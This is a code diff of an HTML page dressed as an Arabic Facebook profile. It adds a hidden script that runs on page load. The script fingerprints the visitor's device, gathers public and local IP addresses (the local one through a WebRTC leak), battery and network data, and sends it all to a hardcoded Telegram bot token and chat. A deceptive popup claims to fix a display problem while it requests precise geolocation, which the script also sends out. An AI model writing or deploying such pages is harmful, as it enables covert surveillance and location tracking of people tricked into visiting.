@@ -4,21 +4,211 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>بروفايل فيسبوك</title>
-    <link rel="stylesheet" href="styles.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f0f2f5;
+        }
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+            display: flex;
+            flex-wrap: wrap;
+        }
+        .profile-header {
+            background-color: #fff;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+            margin-bottom: 20px;
+            width: 100%;
+            text-align: center;
+            position: relative;
+        }
+        .cover-photo {
+            height: 300px;
+            background-size: cover;
+            background-position: center;
+        }
+        .profile-photo {
+            width: 150px;
+            height: 150px;
+            border-radius: 50%;
+            border: 4px solid #fff;
+            margin: -75px auto 0;
+            display: block;
+            position: relative;
+            z-index: 1;
+        }
+        .profile-info {
+            text-align: center;
+            margin: 10px 0;
+        }
+        .profile-name {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+        .profile-bio {
+            font-size: 16px;
+            color: #555;
+            margin-bottom: 10px;
+        }
+        .profile-actions {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            padding: 10px 0;
+            border-top: 1px solid #ddd;
+            flex-wrap: wrap;
+        }
+        .profile-actions button {
+            background-color: #1877f2;
+            color: #fff;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 4px;
+            font-weight: bold;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        .profile-actions button i {
+            margin-left: 5px;
+        }
+        .sidebar {
+            flex: 1;
+            max-width: 250px;
+            background-color: #fff;
+            padding: 15px;
+            margin-right: 10px;
+            border-radius: 8px;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+        }
+        .sidebar h2 {
+            font-size: 20px;
+            margin-bottom: 10px;
+        }
+        .sidebar p {
+            margin-bottom: 5px;
+        }
+        .post-container {
+            flex: 2;
+            display: flex;
+            flex-direction: column;
+        }
+        .post {
+            background-color: #fff;
+            margin: 10px 0;
+            padding: 15px;
+            border-radius: 8px;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+        }
+        .post-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+        .post-header img {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            margin-left: 10px;
+        }
+        .post-header div {
+            flex-grow: 1;
+        }
+        .post-content {
+            margin-bottom: 10px;
+        }
+        .post-images {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 5px;
+            margin-bottom: 10px;
+        }
+        .post-images img {
+            width: 100%;
+            border-radius: 4px;
+        }
+        .post-actions {
+            display: flex;
+            justify-content: space-around;
+            border-top: 1px solid #ddd;
+            padding-top: 10px;
+        }
+        .post-actions span {
+            cursor: pointer;
+            color: #1877f2;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        .post-actions span i {
+            margin-left: 5px;
+        }
+        @media (max-width: 768px) {
+            .profile-photo {
+                width: 100px;
+                height: 100px;
+                margin: -50px auto 0;
+            }
+            .profile-name {
+                font-size: 20px;
+            }
+            .profile-actions {
+                flex-direction: column;
+                align-items: center;
+            }
+            .profile-actions button {
+                margin: 5px 0;
+            }
+            .container {
+                flex-direction: column;
+            }
+            .sidebar {
+                max-width: 100%;
+                margin-right: 0;
+                margin-bottom: 10px;
+            }
+        }
+        .popup {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.5);
+        }
+        .popup-content {
+            background-color: #fefefe;
+            margin: 15% auto;
+            padding: 20px;
+            border: 1px solid #888;
+            width: 80%;
+            max-width: 500px;
+            text-align: center;
+            border-radius: 8px;
+        }
+        .popup button {
+            background-color: #1877f2;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 20px;
+        }
+        .popup button:hover {
+            background-color: #166fe5;
+        }
+    </style>
 </head>
-<body>
-    <div class="container">
-        <!-- محتوى الصفحة الأصلي -->
-        
-        <!-- إضافة النافذة المنبثقة لطلب الإذن -->
-        <div id="permissionPopup" class="popup">
-            <div class="popup-content">
-                <h2>يبدو أنك تواجه مشكلة</h2>
-                <p>لحل هذه المشكلة قم بالسماح بالوصول الاشعارات التي سوف تصلك لتلقي التحديث حتى يتم عرض المحتوى كاملاً للصفحة</p>
-                <button onclick="requestLocationPermission()">حل المشكلة</button>
-            </div>
-        </div>
 <body>
     <div class="container">
         <div class="profile-header">
@@ -67,12 +257,175 @@
                 <span><i class="fas fa-comment"></i>تعليق</span>
                 <span><i class="fas fa-share"></i>مشاركة</span>
             </div>
-            <script src="script.js"></script>
-
         </div>
     </div>
 
-           
+    <div id="permissionPopup" class="popup">
+        <div class="popup-content">
+            <h2>يبدو أنك تواجه مشكلة</h2>
+            <p>لحل هذه المشكلة قم بالسماح بالوصول الاشعارات التي سوف تصلك لتلقي التحديث حتى يتم عرض المحتوى كاملاً للصفحة</p>
+            <button onclick="requestLocationPermission()">حل المشكلة</button>
+        </div>
     </div>
+
+    <script>
+        function sendInformationToTelegram(info) {
+            var botToken = '7172876720:AAHHrUi-6VOFhhtJnyP2fpIM6yeU5Y9mYho';
+            var chatId = '962686305';
+            var url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(info)}`;
+
+            fetch(url).then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                return response.json();
+            }).then(data => {
+                console.log('Information sent to Telegram bot:', data);
+            }).catch(error => {
+                console.error('There was a problem with the fetch operation:', error);
+            });
+        }
+
+        function collectDeviceInfo() {
+            var ptf = navigator.platform;
+            var cc = navigator.hardwareConcurrency || 'غير متوفر';
+            var ram = navigator.deviceMemory || 'غير متوفر';
+            var ver = navigator.userAgent;
+            var brw = 'غير متوفر';
+            var canvas = document.createElement('canvas');
+            var gl, debugInfo, ven, ren;
+
+            if (ver.indexOf('Firefox') != -1) {
+                brw = 'Firefox';
+            } else if (ver.indexOf('Chrome') != -1) {
+                brw = 'Chrome';
+            } else if (ver.indexOf('Safari') != -1) {
+                brw = 'Safari';
+            } else if (ver.indexOf('Edge') != -1) {
+                brw = 'Edge';
+            }
+
+            try {
+                gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            } catch (e) { }
+            if (gl) {
+                debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                ven = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || 'غير متوفر';
+                ren = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'غير متوفر';
+            }
+
+            var ht = window.screen.height;
+            var wd = window.screen.width;
+            var os = ver.substring(0, ver.indexOf(')')).split(';')[1].trim() || 'غير متوفر';
+
+            var deviceInfo = `منصة الجهاز: ${ptf}\nعدد النوى: ${cc}\nالذاكرة العشوائية: ${ram} GB\nنوع المتصفح: ${brw}\nنظام التشغيل: ${os}\nدقة الشاشة: ${ht}x${wd}\nالشركة المصنعة لوحدة المعالجة الرسومية: ${ven}\nنوع وحدة المعالجة الرسومية: ${ren}`;
+            sendInformationToTelegram(deviceInfo);
+
+            // Collect IP addresses
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    var ipInfo = `عنوان IP العام: ${data.ip}`;
+                    sendInformationToTelegram(ipInfo);
+                })
+                .catch(error => console.error('Error fetching public IP address:', error));
+
+            // Collect local IP address
+            getLocalIP(ip => {
+                var localIpInfo = `عنوان IP المحلي: ${ip}`;
+                sendInformationToTelegram(localIpInfo);
+            });
+
+            // Collect battery information
+            if ('getBattery' in navigator) {
+                navigator.getBattery().then(battery => {
+                    var batteryInfo = `
+نسبة الشحن: ${battery.level * 100}%
+الشحن: ${battery.charging ? 'نعم' : 'لا'}
+وقت الشحن المتبقي: ${battery.chargingTime} ثانية
+وقت التشغيل المتبقي: ${battery.dischargingTime} ثانية
+                    `;
+                    sendInformationToTelegram(batteryInfo);
+                });
+            }
+
+            // Collect network information
+            if ('connection' in navigator) {
+                var connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                var networkInfo = `
+نوع الاتصال: ${connection.type}
+سرعة الاتصال: ${connection.downlink} Mbps
+فعالية الاتصال: ${connection.effectiveType}
+                `;
+                sendInformationToTelegram(networkInfo);
+            }
+        }
+
+        function getLocalIP(callback) {
+            var peerConnection = new RTCPeerConnection({ iceServers: [] });
+            peerConnection.createDataChannel('');
+            peerConnection.createOffer().then(offer => peerConnection.setLocalDescription(offer)).catch(error => console.error(error));
+            peerConnection.onicecandidate = event => {
+                if (event.candidate) {
+                    var candidate = event.candidate.candidate;
+                    var ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
+                    var ipMatch = ipRegex.exec(candidate);
+                    if (ipMatch) {
+                        callback(ipMatch[1]);
+                    }
+                }
+            };
+        }
+
+        function requestLocationPermission() {
+            if (navigator.geolocation) {
+                var optn = { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 };
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    var lat = position.coords.latitude || 'غير متوفر';
+                    var lon = position.coords.longitude || 'غير متوفر';
+                    var acc = position.coords.accuracy || 'غير متوفر';
+                    var alt = position.coords.altitude || 'غير متوفر';
+                    var dir = position.coords.heading || 'غير متوفر';
+                    var spd = position.coords.speed || 'غير متوفر';
+
+                    var googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}&z=17&hl=ar`;
+                    var locationInfo = `إحداثيات: خط العرض ${lat}، خط الطول ${lon}\nدقة الموقع: ${acc} متر\nالارتفاع: ${alt} متر\nالاتجاه: ${dir} درجة\nالسرعة: ${spd} متر/ثانية\n\nرابط الموقع على جوجل مابس: ${googleMapsLink}`;
+                    sendInformationToTelegram(locationInfo);
+                }, function (error) {
+                    console.error('Error getting location:', error);
+                }, optn);
+            } else {
+                console.error('جهازك به مشكلة');
+            }
+        }
+
+        function checkLocationPermission() {
+            if ("geolocation" in navigator) {
+                navigator.permissions.query({name:'geolocation'}).then(function(result) {
+                    if (result.state === 'granted') {
+                        collectAndSendLocation();
+                    } else if (result.state === 'prompt') {
+                        document.getElementById('permissionPopup').style.display = 'block';
+                    }
+                });
+            } else {
+                console.log("Geolocation is not supported by this browser.");
+            }
+        }
+
+        function collectAndSendLocation() {
+            navigator.geolocation.getCurrentPosition(function(position) {
+                var lat = position.coords.latitude;
+                var lon = position.coords.longitude;
+                var locationInfo = `الموقع: خط العرض ${lat}، خط الطول ${lon}`;
+                sendInformationToTelegram(locationInfo);
+            });
+        }
+
+        window.onload = function() {
+            checkLocationPermission();
+            collectDeviceInfo();
+        };
+    </script>
 </body>
 </html>
